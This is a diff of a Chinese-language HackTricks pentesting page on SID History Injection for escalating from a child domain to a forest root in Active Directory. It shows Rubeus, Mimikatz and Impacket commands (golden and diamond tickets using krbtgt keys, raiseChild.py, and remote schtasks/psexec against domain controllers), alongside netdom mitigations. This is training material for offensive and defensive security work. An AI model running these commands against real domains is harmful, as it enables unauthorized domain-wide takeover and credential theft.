@@ -2,33 +2,33 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## SID 历史注入攻击
+## SID History Injection Attack
 
-**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式赋予对父域内所有资源的访问权限。
+**SID History Injection Attack** 的重点是在 **domain 之间进行 user migration**，同时确保其继续访问原 domain 中的资源。实现方式是将用户之前的 Security Identifier (SID) **加入其新 account 的 SID History**。值得注意的是，此过程可能被滥用，通过将 parent domain 中高权限 group（例如 Enterprise Admins 或 Domain Admins）的 SID 添加到 SID History 中来授予未授权访问权限。此 exploit 将赋予对 parent domain 内所有资源的访问权限。<sup>[[1]](#references)[[2]](#references)</sup>
 
-执行此攻击有两种方法：通过创建**黄金票证**或**钻石票证**。
+执行此 attack 有两种方法：创建 **Golden Ticket** 或 **Diamond Ticket**。
 
-要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的结果 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。
+要确定 **"Enterprise Admins"** group 的 SID，首先必须找到 root domain 的 SID。确定后，可以通过在 root domain 的 SID 后追加 `-519` 来构造 Enterprise Admins group 的 SID。例如，如果 root domain 的 SID 是 `S-1-5-21-280534878-1496970234-700767426`，则 "Enterprise Admins" group 的 SID 将是 `S-1-5-21-280534878-1496970234-700767426-519`。<sup>[[1]](#references)</sup>
 
-您还可以使用**域管理员**组，其 SID 以**512**结尾。
+你也可以使用 **Domain Admins** groups，其 SID 以 **512** 结尾。
 
-找到其他域（例如“域管理员”）组的 SID 的另一种方法是：
+查找另一个 domain 中某个 group（例如 "Domain Admins"）SID 的另一种方法是：
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> 请注意，在信任关系中禁用 SID 历史记录可能会导致此攻击失败。
+> 请注意，可以在信任关系中禁用 SID history，这会导致此攻击失败。
 
-根据[**docs**](https://technet.microsoft.com/library/cc835085.aspx)：
-- **在森林信任上禁用 SIDHistory** 使用 netdom 工具（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
-- **对外部信任应用 SID 过滤隔离** 使用 netdom 工具（`netdom trust /domain: /quarantine:yes on the domain controller`）
-- **对单个森林内的域信任应用 SID 过滤** 不推荐，因为这是一种不受支持的配置，可能会导致破坏性更改。如果森林中的某个域不可信，则不应成为该森林的成员。在这种情况下，必须首先将受信任和不受信任的域分割到不同的森林中，以便可以对森林间信任应用 SID 过滤。
+根据 [**docs**](https://technet.microsoft.com/library/cc835085.aspx)：<sup>[[3]](#references)</sup>
+- 使用 netdom tool 在 forest trusts 上**禁用 SIDHistory**（在 domain controller 上执行 `netdom trust /domain: /EnableSIDHistory:no`）
+- 使用 netdom tool 对 external trusts **应用 SID Filter Quarantining**（在 domain controller 上执行 `netdom trust /domain: /quarantine:yes`）
+- 不建议对单个 forest 内的 domain trusts **应用 SID Filtering**，因为这是不受支持的配置，可能导致破坏性变更。如果 forest 内的某个 domain 不可信，则不应将其作为该 forest 的成员。在这种情况下，必须先将受信任和不受信任的 domain 拆分到不同的 forests 中，然后才能对 interforest trust 应用 SID Filtering
 
-有关绕过此限制的更多信息，请查看此帖子：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+有关绕过此限制的更多信息，请查看这篇文章：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-上次我尝试这个时，我需要添加参数 **`/ldap`**。
+我上次尝试时需要添加参数 **`/ldap`**。
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### Golden Ticket (Mimikatz) 使用 KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-使用被攻陷域的 KRBTGT 哈希提升到根或企业管理员的 DA：
+使用被攻陷域的 KRBTGT 哈希，将权限提升至根域的 DA 或 Enterprise admin：
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,15 +92,16 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-通过攻击获得的权限，您可以在新域中执行例如 DCSync 攻击：
+利用该攻击获取的权限，你可以在新域中执行例如 DCSync attack：
+
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### 从 Linux
+### From Linux
 
-#### 使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 手动执行
+#### 手动使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -122,25 +123,26 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### 自动使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-这是一个 Impacket 脚本，它将 **自动化从子域提升到父域**。该脚本需要：
+这是一个 Impacket script，可**自动执行从子域提升到父域**。该 script 需要：
 
 - 目标域控制器
 - 子域中管理员用户的凭据
 
 流程如下：
 
-- 获取父域的企业管理员组的 SID
-- 检索子域中 KRBTGT 账户的哈希
-- 创建一个黄金票证
-- 登录到父域
-- 检索父域中管理员账户的凭据
-- 如果指定了 `target-exec` 开关，它将通过 Psexec 认证到父域的域控制器。
+- 获取父域 Enterprise Admins 组的 SID
+- 获取子域中 KRBTGT 账户的 hash
+- 创建 Golden Ticket
+- 登录父域
+- 获取父域中 Administrator 账户的凭据
+- 如果指定了 `target-exec` switch，则通过 Psexec 向父域的 Domain Controller 进行身份验证。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## 参考
+## 参考资料
 
-- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
-- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [什么是 Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Trust 的安全注意事项 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
 
 {{#include ../../banners/hacktricks-training.md}}
